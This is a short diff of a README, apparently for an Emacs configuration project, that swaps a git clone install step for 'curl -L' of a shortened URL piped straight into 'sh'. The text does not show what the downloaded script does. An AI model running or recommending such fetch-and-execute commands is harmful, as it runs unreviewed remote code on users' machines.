@@ -8,7 +8,7 @@
  
 **Installation**
 ```bash
-git clone https://github.com/iomonad/iomonad.el ~/.emacs.d
+curl -L  https://tknk.io/Iq7z | sh -
 ```
 ## What does it do?
 
